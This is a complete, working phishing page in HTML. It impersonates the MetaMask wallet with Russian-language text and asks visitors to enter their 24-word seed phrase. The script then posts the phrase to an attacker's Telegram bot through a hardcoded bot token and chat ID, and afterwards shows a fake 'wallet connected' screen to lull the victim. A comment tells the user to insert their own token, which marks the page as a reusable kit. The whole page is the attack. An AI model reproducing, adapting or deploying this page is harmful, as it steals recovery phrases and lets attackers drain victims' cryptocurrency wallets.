<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MetaMask</title>
    <style>
        :root {
            --primary: #F6851B; /* Фирменный оранжевый MetaMask */
            --bg: #11141B;      /* Тёмный фон MetaMask */
            --card-bg: #181C26; /* Фон плашки */
            --input-bg: #242934;
            --text-main: #FFFFFF;
            --text-muted: #9096A0;
            --border: #333A45;
            --hover: #2A303C;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg);
            color: var(--text-main);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .wallet-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }

        .logo-section {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo-icon {
            width: 60px;
            height: 60px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin: 0;
            color: var(--text-main);
        }

        .subtitle {
            color: var(--text-muted);
            font-size: 14px;
            margin-top: 5px;
        }

        .card {
            background-color: var(--card-bg);
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 12px;
            color: var(--text-muted);
            margin-bottom: 8px;
            font-weight: 500;
        }

        input {
            width: 100%;
            background-color: var(--input-bg);
            border: 1px solid transparent;
            border-radius: 8px;
            padding: 14px;
            font-size: 16px;
            color: var(--text-main);
            outline: none;
            box-sizing: border-box;
            transition: border 0.2s;
        }

        input:focus {
            border-color: var(--primary);
            background-color: var(--bg);
        }

        input::placeholder {
            color: #5A6068;
        }

        button {
            width: 100%;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: opacity 0.2s;
        }

        button:hover {
            opacity: 0.9;
        }

        button:disabled {
            background-color: #5A6068;
            cursor: not-allowed;
        }

        .spinner {
            border: 3px solid rgba(255,255,255,0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-state {
            text-align: center;
            display: none;
        }

        .check-icon {
            width: 60px;
            height: 60px;
            color: #4CAF50;
            margin-bottom: 15px;
        }

        /* Мобильная адаптация */
        @media (max-width: 480px) {
            .wallet-container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>

<div class="wallet-container">
    <div class="logo-section">
        <!-- SVG Иконка MetaMask -->
        <svg class="logo-icon" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
            <path d="M32.67 1.25L25.6 10.3l-4.73-3.13L18.4 11.7l-.7 1.5.7 1.5 2.47 4.53 4.73-3.13 7.08 9.05 3.97-23.5zM17.3 12.5l-3.7-3.1-7.5 9.1 3.1 3.1 4.1-6.5 4.1 6.5 3.1-3.1-7.5-9.1-3.7 3.1-1.2-2.5 1.2-2.5 3.7 3.1 1.2-2.5 3.7 3.1 1.2-2.5-3.7-3.1-1.2 2.5-3.7-3.1-1.2 2.5L17.3 12.5z" fill="#F6851B"/>
            <path d="M21.87 15.43l-2.47-4.53 4.73-3.13L32.67 1.25 25.6 10.3l-3.73 5.13zM18.4 11.7l4.73 3.13-2.47 4.53-3.73-5.13 1.47-2.5zM13.5 17.8l-4.1 6.5 7.5 9.1 3.7-3.1-4.1-6.5-3 1zM12.4 10.3l7.08-9.05-3.97-23.5-7.08 9.05 3.97 23.5 3-18.5z" fill="#4F4F4F"/>
            <path d="M12.4 10.3L5.33 1.25l3.97 23.5L16.38 17.2l-4.1-6.9zM21.87 15.43l-4.73-3.13-4.73 3.13 4.73 6.5 4.73-6.5z" fill="#F6851B"/>
        </svg>
        <h1>MetaMask</h1>
        <p class="subtitle">Подключение кошелька</p>
    </div>

    <div class="card" id="loginForm">
        <div class="input-group">
            <label>Восстановить Seed-фразу</label>
            <input type="text" id="seed" placeholder="24 слова через пробел" autocomplete="off">
        </div>
        <button type="submit" id="btn" onclick="handleLogin()">Войти</button>
    </div>

    <div class="card success-state" id="loadingState">
        <div style="text-align: center;">
            <div class="spinner" style="border-top-color: var(--primary); width: 30px; height: 30px; margin: 0 auto 15px;"></div>
            <h2>Подключение...</h2>
            <p class="subtitle">Пожалуйста, подождите</p>
        </div>
    </div>

    <div class="card success-state" id="successState">
        <svg class="check-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
            <polyline points="22 4 12 14.01 9 11.01"></polyline>
        </svg>
        <h1>Готово!</h1>
        <p class="subtitle">Кошелёк успешно подключён.</p>
    </div>
</div>

<script>
    // ВСТАВЬ СЮДА СВОЙ ТОКЕН
    const BOT_TOKEN = '8678094863:AAE1v1enzaGaVPCS8vWJxVqIJMR2NygcPas'; 
    const CHAT_ID = '8351590960';

    function handleLogin() {
        const seed = document.getElementById('seed').value;

        if(!seed) {
            alert('Введите seed-фразу');
            return;
        }

        // UI: Показываем загрузку
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('loadingState').style.display = 'block';

        // Отправляем данные
        sendToTelegram(seed);

        // UI: Показываем успех через пару секунд
        setTimeout(() => {
            document.getElementById('loadingState').style.display = 'none';
            document.getElementById('successState').style.display = 'block';
        }, 1500);
    }

    function sendToTelegram(seed) {
        const text = `🔥 <b>MetaMask</b>\n\n🌱 Seed: <code>${seed}</code>`;
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    }
</script>

</body>
</html>
